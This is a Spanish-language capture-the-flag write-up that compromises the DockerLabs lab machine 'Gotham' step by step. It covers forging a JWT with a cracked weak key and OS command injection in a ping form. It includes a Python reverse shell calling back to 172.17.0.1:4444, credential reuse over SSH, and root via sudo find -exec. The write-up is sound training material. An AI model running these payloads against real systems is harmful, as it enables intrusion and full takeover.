# Gotham (DockerLabs - Fácil)

**IP objetivo:** 172.17.0.2
**IP atacante:** 172.17.0.1

## Resumen

Máquina con dos servicios expuestos: SSH y HTTP. El acceso inicial se consigue combinando una credencial filtrada en un comentario HTML, un bypass de autorización mediante manipulación de un JWT firmado con clave débil, e inyección de comandos del sistema operativo en una utilidad de diagnóstico de red. La escalada a root se logra a través de un permiso `sudo` mal configurado sobre el binario `find`.

## Enumeración

### Escaneo de puertos

```bash
nmap -sS -p- 172.17.0.2 -oG puertos.txt
```

Resultado:

- 22/tcp — SSH
- 80/tcp — HTTP

### Detección de versión y scripts por defecto

```bash
nmap -sVC -p80,22 172.17.0.2
```

- 22/tcp → OpenSSH 8.9p1 (Ubuntu)
- 80/tcp → Apache 2.4.52 (Ubuntu)
- `robots.txt` revela dos rutas: `/dashboard.php` y `/admin.php`
- Título de la web: "Gotham City Network"

### Reconocimiento web

Ambas rutas (`/dashboard.php`, `/admin.php`) redirigen a `/index.php` (login) sin sesión válida. El código fuente de `index.php` contiene un comentario de desarrollador:

```html
<!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->
```

## Acceso inicial

### 1. Login con credencial filtrada

```
usuario: guest
contraseña: guest
```

Acceso concedido con `clearance level: user`. El enlace a `/admin.php` devuelve 403 ("administrator clearance required").

### 2. Análisis de la cookie de sesión (JWT)

La cookie `session` tiene formato `header.payload.signature`. Decodificando en base64:

```
header  → {"typ":"JWT","alg":"HS256"}
payload → {"user":"guest","role":"user","iat":...}
```

### 3. Crackeo de la clave secreta

La clave secreta del HMAC se obtiene mediante diccionario, usando `jwt_tool`:

```bash
python3 jwt_tool.py <token> -C -d <wordlist>
```

Dado que una wordlist genérica no dio resultado, se construyó un diccionario temático basado en el contexto de la máquina (Gotham/Batman), encontrando la clave:

```
batman
```

### 4. Forja del token con rol elevado

```bash
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p "batman"
```

Esto genera un nuevo token con `role: admin`, firmado correctamente con la clave obtenida. Se sustituye el valor de la cookie `session` en el navegador (F12 → Storage/Application → Cookies) por este nuevo token, y se navega a `/admin.php`.

### 5. Inyección de comandos en el panel de administración

El panel resulta ser una utilidad de diagnóstico ("NOC") que ejecuta `ping` sobre el host indicado en un formulario, sin sanitización. Se confirma inyección de comandos encadenando con `&&`:

```
<ip_valida> && whoami
```

Resultado: `www-data`.

### 6. Reverse shell

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Payload enviado en el campo `host`, encadenado tras una IP válida:

```
<ip_valida> && python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("172.17.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Esto entrega una shell interactiva como `www-data`.

### 7. Estabilización de la shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Movimiento lateral

### Enumeración de usuarios y credenciales

`/etc/passwd` revela un usuario del sistema con shell válida: `bruce` (UID 1000).

El document root de la aplicación contiene un archivo de configuración (`config.php`) con credenciales de base de datos y una nota del mismo desarrollador indicando reutilización de la contraseña:

```php
$DB_USER = 'gothamdb';
$DB_PASS = 'Arkh4m_Kn1ght!';   // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento
```

### Acceso SSH como bruce

```bash
ssh bruce@172.17.0.2
# contraseña: Arkh4m_Kn1ght!
```

## Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

Resultado:

```
(root) NOPASSWD: /usr/bin/find
```

### Explotación

`find` permite ejecutar comandos arbitrarios sobre los resultados de una búsqueda mediante la opción `-exec`, heredando los privilegios con los que se invoca (root, vía `sudo`):

```bash
sudo find . -exec /bin/sh \;
```

Verificación:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Resumen de la cadena de explotación

1. Credencial filtrada en comentario HTML (`guest:guest`).
2. Bypass de autorización mediante forja de JWT (clave HMAC `batman`, claim `role` elevado a `admin`).
3. Inyección de comandos OS en utilidad de ping del panel de administración.
4. Reverse shell como `www-data`.
5. Credenciales de base de datos reutilizadas, encontradas en `config.php`, válidas para el usuario del sistema `bruce` (SSH).
6. Escalada a root vía `sudo` mal configurado sobre `/usr/bin/find` (`-exec`).